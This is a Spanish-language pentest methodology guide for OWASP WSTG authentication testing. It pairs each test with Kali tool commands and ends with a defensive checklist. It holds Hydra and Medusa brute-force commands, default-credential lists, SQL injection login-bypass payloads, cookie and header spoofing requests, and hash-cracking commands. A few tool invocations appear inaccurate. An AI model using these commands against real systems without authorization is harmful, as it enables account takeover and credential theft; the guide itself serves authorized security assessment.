# Fase 4: Authentication Testing (WSTG-ATHN)

## Objetivo
Evaluar la robustez del mecanismo de autenticación de la aplicación web, identificando debilidades que puedan permitir el bypass, acceso no autorizado o comprometer las credenciales de los usuarios.

## Descripción General
La autenticación es uno de los componentes más críticos en la seguridad de aplicaciones web. Un mecanismo de autenticación débil puede comprometer toda la seguridad del sistema. Esta fase evalúa todos los aspectos del proceso de autenticación desde la fuerza bruta hasta la implementación de MFA.

## Tests Incluidos

### WSTG-ATHN-01: Testing for Credentials Transported over an Encrypted Channel
**Objetivo**: Verificar que las credenciales se transmiten sobre canales cifrados
**Aspectos a verificar**:
- Uso exclusivo de HTTPS para login
- Certificados SSL/TLS válidos
- No transmisión de credenciales en texto plano
- Redirección automática a HTTPS

**Herramientas Kali:**
```bash
# Verificar configuración SSL/TLS
testssl.sh https://target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Interceptar tráfico con Wireshark/Tshark
tshark -i eth0 -Y "http.request.method == POST" -w capture.pcap
```

**Criterios de éxito:**
- Todas las páginas de autenticación usan HTTPS
- No hay formularios HTTP para credenciales
- Redirección automática de HTTP a HTTPS

### WSTG-ATHN-02: Testing for Default Credentials
**Objetivo**: Identificar y probar credenciales por defecto
**Credenciales comunes a probar**:
- admin/admin, admin/password, admin/12345
- root/root, root/toor, root/password
- test/test, demo/demo, guest/guest
- Credenciales específicas de la aplicación/plataforma

**Herramientas Kali:**
```bash
# Hydra para fuerza bruta
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid=Failed"

# Medusa para fuerza bruta
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login

# Patrones automáticos con custom scripts
```

### WSTG-ATHN-03: Testing for Weak Lock Out Mechanism
**Objetivo**: Evaluar el mecanismo de bloqueo de cuentas
**Aspectos a verificar**:
- Número de intentos antes del bloqueo
- Duración del bloqueo
- Mensajes de error consistentes
- Protección contra timing attacks

**Testing Manual:**
```bash
# Script para probar lockout
for i in {1..20}; do
    curl -X POST -d "username=test&password=wrong$i" https://target.com/login
    sleep 1
done
```

**Indicadores de weak lockout:**
- Más de 10 intentos permitidos
- Bloqueo temporal muy corto (<5 minutos)
- Mensajes que revelan información

### WSTG-ATHN-04: Testing for Bypassing Authentication Schema
**Objetivo**: Identificar métodos para bypass de autenticación
**Técnicas de bypass:**
- SQL Injection en parámetros de autenticación
- Manipulación de cookies/session
- Bypass mediante parámetros URL
- Inyección de headers HTTP

**Payloads de bypass:**
```sql
-- SQL Injection básica
admin' --
admin' OR '1'='1' --
admin' OR 1=1#
' OR '1'='1' --

-- Advanced SQLi
admin' UNION SELECT * FROM users--
' OR (SELECT COUNT(*) FROM users) > 0--
```

**Headers HTTP para manipular:**
```bash
# Manipular cookies
curl -H "Cookie: authenticated=true; role=admin" https://target.com/admin

# Bypass mediante headers
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/login
curl -H "X-Original-URL: /admin" https://target.com/login
```

### WSTG-ATHN-05: Testing for Vulnerable Remember Password
**Objetivo**: Evaluar la funcionalidad de "Recordar contraseña"
**Aspectos a verificar:**
- Almacenamiento seguro de tokens de recuerda
- Expiración adecuada de tokens
- No adivinabilidad de tokens
- Revocación de tokens

**Testing de tokens:**
```python
# Analizar cookies de "remember"
cookies = browser.get_cookies()
for cookie in cookies:
    if 'remember' in cookie['name'].lower():
        print(f"Token: {cookie['value']}")
        print(f"Expires: {cookie.get('expiry')}")
        print(f"Secure: {cookie.get('secure')}")
        print(f"HttpOnly: {cookie.get('httponly')}")
```

### WSTG-ATHN-06: Testing for Browser Cache Weakness
**Objetivo**: Verificar que las credenciales no se almacenan en cache
**Aspectos a verificar**:
- Headers anti-cache en páginas de login
- Autocomplete deshabilitado en campos de contraseña
- No almacenamiento de credenciales en navegador

**Headers anti-cache recomendados:**
```
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0
```

**Testing en browser:**
```javascript
// Verificar si las credenciales se guardan en autocompletar
document.querySelector('input[type="password"]').autocomplete
```

### WSTG-ATHN-07: Testing for Weak Password Policy
**Objetivo**: Evaluar la política de contraseñas
**Criterios de evaluación**:
- Longitud mínima (8+ caracteres)
- Complejidad (mayúsculas, minúsculas, números, especiales)
- No contraseñas comunes
- Historial de contraseñas
- Expiración periódica

**Testing de políticas:**
```python
# Casos de prueba para políticas de contraseña
test_passwords = [
    "123456",           # Solo números
    "password",         # Diccionario
    "qwerty",           # Teclado
    "123",              # Demasiado corta
    "Password1",        # Débil pero cumple básicos
    "P@ssw0rd!2023",    # Fuerte
]
```

### WSTG-ATHN-08: Testing for Weak Security Question Answer
**Objetivo**: Evaluar preguntas de seguridad para recuperación de contraseña
**Aspectos a verificar**:
- Preguntas no públicas o adivinables
- Respuestas no case-sensitive
- Rate limiting en recuperación
- No revelar si usuario existe

**Testing automatizado:**
```python
# Enumeración de usuarios por recuperación de contraseña
common_emails = ["admin@target.com", "test@target.com"]
for email in common_emails:
    response = requests.post('/forgot-password', data={'email': email})
    # Analizar diferencias en respuestas
```

### WSTG-ATHN-09: Testing for Weak Password Change or Reset Functionalities
**Objetivo**: Evaluar flujo de cambio/reset de contraseña
**Vulnerabilidades comunes:**
- Tokens predecibles de reset
- No validación de contraseña actual para cambio
- Rate limiting ausente
- Expiración larga de tokens

**Testing de tokens de reset:**
```python
# Analizar patrón de tokens
tokens = []
for i in range(10):
    token = request_password_reset("test@example.com")
    tokens.append(token)

# Verificar si hay patrones
print(f"Tokens generados: {tokens}")
```

### WSTG-ATHN-10: Testing for Weaker Authentication in Alternative Channel
**Objetivo**: Evaluar autenticación en canales alternativos
**Canales a verificar**:
- API móvil
- Aplicación de escritorio
- Servicios web internos
- Interfaces administrativas

**Testing de APIs:**
```bash
# Testing de endpoints de autenticación API
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"test"}' \
     https://api.target.com/auth/login
```

### WSTG-ATHN-11: Testing Multi-Factor Authentication (MFA)
**Objetivo**: Evaluar implementación de MFA
**Aspectos a verificar**:
- Configuración correcta de MFA
- No bypass posible
- Backups de recuperación seguros
- Rate limiting en códigos OTP

**Herramientas Kali:**
```bash
# Interceptación de OTP con Wireshark
tshark -i eth0 -Y "sms or otp" -w otp_capture.pcap

# Análisis de tokens JWT
python -m jwt.decode <jwt_token>
```

## Herramientas Kali Recomendadas

### **Herramientas Principales**
1. **Hydra** - Fuerza bruta para múltiples protocolos
2. **Medusa** - Paralell password cracker
3. **Nmap** - Escaneo de puertos y detección de servicios de autenticación
4. **Burp Suite** - Interceptación y manipulación de tráfico web
5. **OWASP ZAP** - Web application security scanner

### **Herramientas Especializadas**
1. **Hashcat** - Password cracking GPU-accelerated
2. **John the Ripper** - Password cracker
3. **CeWL** - Custom wordlist generator
4. **Crunch** - Wordlist generator
5. **Patator** - Multi-purpose brute-forcer

### **Wordlists de Kali**
```bash
# Ubicaciones comunes de wordlists en Kali
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

## Comandos de Kali para Authentication Testing

### **Escaneo de Puertos y Servicios**
```bash
# Escaneo completo de servicios
nmap -sV -sC -p- target.com

# Escaneo de puertos comunes de autenticación
nmap -p 21,22,23,25,53,80,110,143,443,993,995 target.com

# Scripts NMAP para autenticación
nmap --script auth-spray target.com
nmap --script brute-force target.com
```

### **Fuerza Bruta con Hydra**
```bash
# SSH
hydra -L users.txt -P passwords.txt -e nsr -V target.com ssh

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Login=Successful"

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt target.com http-get -m /

# FTP
hydra -L users.txt -P passwords.txt ftp://target.com

# SMB
hydra -L users.txt -P passwords.txt smb://target.com
```

### **Análisis SSL/TLS**
```bash
# Test completo de SSL/TLS
testssl.sh --quiet --color 0 https://target.com

# Escaneo de certificados SSL
nmap --script ssl-cert -p 443 target.com

# Enumeración de cifrados SSL
nmap --script ssl-enum-ciphers -p 443 target.com

# Check Heartbleed
nmap -p 443 --script ssl-heartbleed target.com
```

### **Password Cracking**
```bash
# Hashcat para diferentes tipos de hash
hashcat -m 0 hashes.txt rockyou.txt          # MD5
hashcat -m 1000 hashes.txt rockyou.txt      # NTLM
hashcat -m 1800 hashes.txt rockyou.txt      # SHA512

# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Ataque mask con Hashcat
hashcat -m 0 -a 3 hashes.txt "?u?l?l?l?l?l?d?d" -O
```

### **Análisis de Cookies y Sesiones**
```bash
# Análisis de cookies con Burp Suite
# Usar el módulo "Cookie Jar" para analizar cookies

# Manipulación de headers con Curl
curl -H "Cookie: session=12345" https://target.com/profile

# Análisis JWT
python3 -c "import jwt; print(jwt.decode('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...', 'secret', algorithms=['HS256']))"
```

## Checklist de Verificación

### **Configuración Básica**
- [ ] HTTPS obligatorio para autenticación
- [ ] Certificados SSL/TLS válidos
- [ ] Headers de seguridad configurados
- [ ] No autocompletar contraseñas
- [ ] CSRF tokens implementados

### **Políticas de Contraseñas**
- [ ] Longitud mínima adecuada
- [ ] Complejidad requerida
- [ ] No contraseñas comunes
- [ ] Historial de contraseñas
- [ ] Expiración periódica

### **Mecanismos de Protección**
- [ ] Rate limiting implementado
- [ ] Lockout mechanism robusto
- [ ] Logs de intentos fallidos
- [ ] Monitorización de anomalías
- [ ] Protección contra brute force

### **Funcionalidades Adicionales**
- [ ] MFA implementado correctamente
- [ ] Recovery seguro
- [ ] Password reset seguro
- [ ] Remember password seguro
- [ ] Session management adecuado

## Métricas de Evaluación

### **Seguridad General**
- Score de configuración HTTPS (0-100)
- Fortaleza de políticas de contraseña
- Nivel de implementación de MFA
- Efectividad de rate limiting

### **Resistencia a Ataques**
- Tiempo estimado de fuerza bruta
- Resistencia a bypass de autenticación
- Seguridad de funcionalidades de recuperación
- Protección contra ataques comunes

## Escenarios de Prueba

### **Escenario 1: Bypass por SQL Injection**
```bash
# Prueba básica de SQLi
curl -X POST -d "username=admin' OR '1'='1' --&password=test" https://target.com/login
```

### **Escenario 2: Fuerza Bruta con Hydra**
```bash
# Crear diccionario personalizado
echo -e "admin\nadministrator\nroot\nuser\ntest" > users.txt
echo -e "password\n123456\nadmin\nroot\ntest" > passwords.txt

# Ejecutar ataque
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Failed=Invalid"
```

### **Escenario 3: Testing de Tokens de Reset**
```python
import requests
import re
import time

def test_password_reset_tokens():
    """Prueba si los tokens de reset son predecibles"""
    tokens = []

    # Generar múltiples tokens
    for i in range(5):
        response = requests.post('https://target.com/forgot-password',
                               data={'email': 'test@target.com'})
        if response.status_code == 200:
            token = extract_token_from_email(response.text)
            if token:
                tokens.append(token)
        time.sleep(1)

    # Analizar patrones
    analyze_token_patterns(tokens)
```

## Referencias
- OWASP Authentication Cheat Sheet
- NIST SP 800-63B Digital Identity Guidelines
- CWE-287: Improper Authentication
- CWE-521: Weak Password Requirements
- Hydra Documentation: https://github.com/vanhauser-thc/thc-hydra
- Hashcat Documentation: https://hashcat.net/wiki/